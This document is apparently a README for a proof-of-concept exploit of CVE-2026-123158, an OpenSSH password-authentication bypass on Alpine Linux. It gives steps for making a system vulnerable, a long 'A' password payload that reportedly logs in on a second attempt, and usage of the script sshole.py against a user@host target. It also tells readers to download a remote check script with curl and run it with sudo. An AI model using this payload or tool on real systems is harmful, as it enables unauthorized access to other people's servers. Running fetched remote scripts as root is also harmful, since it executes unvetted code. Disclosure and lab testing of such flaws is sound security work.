# CVE-2026-123158 PoC

Proof of Concept (PoC) exploit for **CVE-2026-123158**.

Based on the research and original repository by [oz9un/sshole](https://github.com/oz9un/sshole/tree/main).

Reference: [Alpine Linux Security Advisory](https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/)

---

## ⚠ Am I vulnerable?

```bash
curl -sO https://raw.githubusercontent.com/oz9un/sshole/main/check.sh
sudo sh check.sh
```

## 💥 How to make myself vulnerable?
```bash
vi /etc/ssh/sshd_config
#PermitRootLogin yes
rc-service sshd restart
rc-update add sshd
adduser -D ssholeuser
echo 'ssholeuser:*' | chpasswd -e
```

## 💻 Testing it using PuTTY

1. Copy and paste the following password into the password prompt (you can paste using a right-click):
```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
2. On your first attempt, it will return an **Access denied** error:
3. On your **exact second attempt** with the same password, you will be successfully logged in:
```text
login as: ssholeuser
ssholeuser@192.168.1.100's password:
Access denied
ssholeuser@192.168.1.100's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

localhost:~$
```








## ⚙️ Prerequisites

Make sure you have Python 3.x installed on your system. This tool requires the `paramiko` library for handling SSH connections.

## 📥 Installation

You can install the required dependency by running:

```bash
pip install paramiko
```

## 🚀 Usage

Run the script by specifying the target user, host, and port:

```bash
python sshole.py [user]@[host] -p [PORT]
```

### Example:

```bash
python sshole.py ssholeuser@192.168.1.100 -p 22
```

---

## ⚠️ Disclaimer

*This software and the information contained in this repository have been created exclusively for educational purposes and security research. Using this tool against systems without explicit authorization is illegal. The authors assume no liability for any misuse or damage caused by this material.*
